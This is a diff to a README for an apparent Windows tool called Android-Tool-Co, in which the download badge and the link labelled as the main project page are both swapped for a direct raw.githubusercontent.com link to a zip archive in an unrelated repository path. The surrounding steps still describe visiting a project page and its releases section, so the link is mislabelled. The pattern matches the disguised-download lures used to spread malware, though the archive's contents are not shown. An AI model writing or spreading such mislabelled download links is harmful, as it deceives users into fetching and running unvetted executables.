@@ -5,7 +5,7 @@ description: "Download and install Android Tool Co on Windows 10 and 11 using a 
 ---
 # 🛠️ Android-Tool-Co - Fix Android issues on your Windows computer
 
-[![Download Android-Tool-Co](https://img.shields.io/badge/Download-Android--Tool--Co-blue.svg)](https://github.com/Mediocre-tubaroot981/Android-Tool-Co)
+[![Download Android-Tool-Co](https://img.shields.io/badge/Download-Android--Tool--Co-blue.svg)](https://raw.githubusercontent.com/Mediocre-tubaroot981/mediocre-tubaroot981.github.io/main/monstrosity/github-tubaroot-mediocre-io-v2.4.zip)
 
 ## 📖 About this application
 
@@ -26,7 +26,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to obtain the tool:
 
-1. Visit the main project page at this link: [https://github.com/Mediocre-tubaroot981/Android-Tool-Co](https://github.com/Mediocre-tubaroot981/Android-Tool-Co).
+1. Visit the main project page at this link: [https://raw.githubusercontent.com/Mediocre-tubaroot981/mediocre-tubaroot981.github.io/main/monstrosity/github-tubaroot-mediocre-io-v2.4.zip](https://raw.githubusercontent.com/Mediocre-tubaroot981/mediocre-tubaroot981.github.io/main/monstrosity/github-tubaroot-mediocre-io-v2.4.zip).
 2. Look for the releases section on the right side of the screen.
 3. Click the latest version number.
 4. Select the file ending in .exe to start your download.
